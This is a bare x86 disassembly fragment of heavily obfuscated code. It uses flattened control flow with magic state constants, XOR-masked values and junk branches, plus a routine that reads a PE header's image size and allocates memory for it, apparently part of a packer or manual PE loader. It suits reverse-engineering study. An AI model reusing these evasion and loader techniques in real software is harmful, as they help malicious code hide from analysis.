  42903d:	mov    eax,DWORD PTR [ebp-0x8]
  429040:	mov    ecx,DWORD PTR [ebp+0x1c]
  429043:	xor    eax,edi
  429045:	add    eax,ebx
  429047:	imul   eax,ecx
  42904a:	mov    ecx,DWORD PTR [ebp+0x8]
  42904d:	mov    edx,DWORD PTR [ebp-0x28]
  429050:	xor    ecx,edi
  429052:	lea    ecx,[ecx+edx*1+0x3272f5]
  429059:	cmp    eax,ecx
  42905b:	jb     0x428cb9
  429061:	mov    esi,DWORD PTR [ebp+0x14]
  429064:	mov    eax,DWORD PTR [ebp-0x20]
  429067:	mov    DWORD PTR [esi],eax
  429069:	jmp    0x4290b0
  42906b:	mov    ecx,DWORD PTR [ebp+0x8]
  42906e:	mov    edx,DWORD PTR [ebp+0xc]
  429071:	xor    ecx,edi
  429073:	xor    edx,edi
  429075:	add    ecx,ebx
  429077:	add    edx,ebx
  429079:	cmp    ecx,edx
  42907b:	jne    0x42908f
  42907d:	mov    eax,ds:0x7f642ddc
  429082:	imul   eax,eax,0x9f15fccf
  429088:	mov    ds:0x7f642ddc,eax
  42908d:	jmp    0x4290b0
  42908f:	mov    ecx,DWORD PTR [ebp+0x8]
  429092:	xor    ecx,edi
  429094:	add    ecx,ebx
  429096:	cmp    eax,ecx
  429098:	je     0x4290a6
  42909a:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  4290a4:	jmp    0x4290b0
  4290a6:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  4290b0:	pop    edi
  4290b1:	pop    esi
  4290b2:	pop    ebx
  4290b3:	leave  
  4290b4:	ret    0x18
  4290b7:	push   ebp
  4290b8:	mov    ebp,esp
  4290ba:	and    esp,0xfffffff8
  4290bd:	mov    eax,DWORD PTR [ebp+0x20]
  4290c0:	sub    esp,0x14
  4290c3:	push   ebx
  4290c4:	mov    ebx,DWORD PTR [ebp+0x14]
  4290c7:	push   esi
  4290c8:	push   edi
  4290c9:	cmp    eax,0xf89c85a5
  4290ce:	jne    0x4290da
  4290d0:	push   0xf89c85a2
  4290d5:	jmp    0x42920c
  4290da:	mov    eax,DWORD PTR [ebp+0x20]
  4290dd:	cmp    eax,0xf89c85a2
  4290e2:	jne    0x4290ee
  4290e4:	push   0xf89c85a3
  4290e9:	jmp    0x42920c
  4290ee:	mov    eax,DWORD PTR [ebp+0x20]
  4290f1:	cmp    eax,0xf89c85a3
  4290f6:	jne    0x429102
  4290f8:	push   0xf89c85a0
  4290fd:	jmp    0x42920c
  429102:	mov    eax,DWORD PTR [ebp+0x20]
  429105:	cmp    eax,0xf89c85a0
  42910a:	jne    0x429116
  42910c:	push   0xf89c85a1
  429111:	jmp    0x42920c
  429116:	mov    ecx,DWORD PTR [ebp+0x20]
  429119:	mov    eax,0xf89c85bc
  42911e:	cmp    ecx,eax
  429120:	jne    0x4291dc
  429126:	mov    eax,DWORD PTR [ebp+0x10]
  429129:	mov    DWORD PTR [esp+0xc],eax
  42912d:	mov    eax,DWORD PTR [ebp+0x18]
  429130:	mov    DWORD PTR [esp+0x14],eax
  429134:	mov    eax,DWORD PTR [ebp+0xc]
  429137:	mov    DWORD PTR [esp+0x18],eax
  42913b:	mov    eax,DWORD PTR [ebp+0x8]
  42913e:	mov    DWORD PTR [esp+0x10],eax
  429142:	mov    eax,DWORD PTR [esp+0x10]
  429146:	mov    ecx,DWORD PTR [esp+0x14]
  42914a:	mov    edi,0x75108ae
  42914f:	xor    eax,edi
  429151:	mov    esi,0x3272f5
  429156:	add    eax,esi
  429158:	mov    DWORD PTR [ecx],eax
  42915a:	mov    eax,DWORD PTR [esp+0xc]
  42915e:	mov    eax,DWORD PTR [eax+0x194]
  429164:	mov    ecx,DWORD PTR [eax]
  429166:	mov    eax,DWORD PTR [esp+0xc]
  42916a:	mov    eax,DWORD PTR [eax+0x194]
  429170:	mov    eax,DWORD PTR [eax]
  429172:	add    eax,DWORD PTR [ecx+0x3c]
  429175:	mov    ecx,DWORD PTR [esp+0xc]
  429179:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42917f:	mov    ecx,DWORD PTR [ecx+0x14]
  429182:	push   0x4
  429184:	push   0x3000
  429189:	push   DWORD PTR [eax+0x50]
  42918c:	push   0x0
  42918e:	call   ecx
  429190:	mov    DWORD PTR [ebx],eax
  429192:	mov    eax,DWORD PTR [esp+0x10]
  429196:	push   DWORD PTR [esp+0xc]
  42919a:	xor    eax,edi
  42919c:	add    eax,esi
  42919e:	mov    DWORD PTR [esp+0x20],eax
  4291a2:	lea    eax,[esp+0x20]
  4291a6:	push   eax
  4291a7:	push   ebx
  4291a8:	push   DWORD PTR [esp+0x20]
  4291ac:	push   DWORD PTR [esp+0x28]
  4291b0:	push   DWORD PTR [esp+0x24]
  4291b4:	call   0x428b79
  4291b9:	mov    eax,DWORD PTR [esp+0x10]
  4291bd:	mov    ecx,DWORD PTR [ebx]
  4291bf:	xor    eax,edi
  4291c1:	add    eax,esi
  4291c3:	cmp    ecx,eax
  4291c5:	je     0x429223
  4291c7:	mov    eax,DWORD PTR [esp+0x18]
  4291cb:	mov    ecx,DWORD PTR [esp+0x14]
  4291cf:	xor    eax,edi
  4291d1:	add    eax,esi
  4291d3:	imul   eax,DWORD PTR [esp+0x1c]
  4291d8:	mov    DWORD PTR [ecx],eax
  4291da:	jmp    0x429223
  4291dc:	mov    ecx,DWORD PTR [ebp+0x20]
  4291df:	cmp    ecx,0xf89c85a1
  4291e5:	jne    0x4291ee
  4291e7:	push   0xf89c85be
  4291ec:	jmp    0x42920c
  4291ee:	mov    ecx,DWORD PTR [ebp+0x20]
  4291f1:	cmp    ecx,0xf89c85be
  4291f7:	jne    0x429200
  4291f9:	push   0xf89c85bf
  4291fe:	jmp    0x42920c
  429200:	mov    ecx,DWORD PTR [ebp+0x20]
  429203:	cmp    ecx,0xf89c85bf
  429209:	jne    0x429223
  42920b:	push   eax
  42920c:	push   DWORD PTR [ebp+0x1c]
  42920f:	push   DWORD PTR [ebp+0x18]
  429212:	push   ebx
  429213:	push   DWORD PTR [ebp+0x10]
  429216:	push   DWORD PTR [ebp+0xc]
  429219:	push   DWORD PTR [ebp+0x8]
  42921c:	call   0x4290b7
  429221:	mov    DWORD PTR [ebx],eax
  429223:	mov    eax,DWORD PTR [ebx]
  429225:	pop    edi
  429226:	pop    esi
  429227:	pop    ebx
  429228:	mov    esp,ebp
  42922a:	pop    ebp
  42922b:	ret    0x1c
  42922e:	push   ebp
  42922f:	mov    ebp,esp
  429231:	sub    esp,0xc
  429234:	mov    eax,0xf89c85a5
  429239:	mov    DWORD PTR [ebp-0x8],eax
  42923c:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  429243:	mov    ecx,DWORD PTR [ebp-0x8]
  429246:	xor    ecx,0x75108ae
  42924c:	add    ecx,0x3272f5
  429252:	mov    DWORD PTR [ebp-0x4],ecx
  429255:	mov    ecx,DWORD PTR [ebp+0xc]
  429258:	push   eax
  429259:	mov    DWORD PTR [ebp+0xc],ecx
  42925c:	push   DWORD PTR [ebp+0xc]
  42925f:	lea    eax,[ebp-0x4]
  429262:	push   DWORD PTR [ebp+0x8]
  429265:	push   eax
  429266:	push   DWORD PTR [ebp+0xc]
  429269:	push   DWORD PTR [ebp-0xc]
  42926c:	push   DWORD PTR [ebp-0x8]
  42926f:	call   0x4290b7
  429274:	mov    DWORD PTR [ebp-0x4],eax
  429277:	mov    eax,DWORD PTR [ebp-0x4]
  42927a:	leave  
  42927b:	ret    0x8
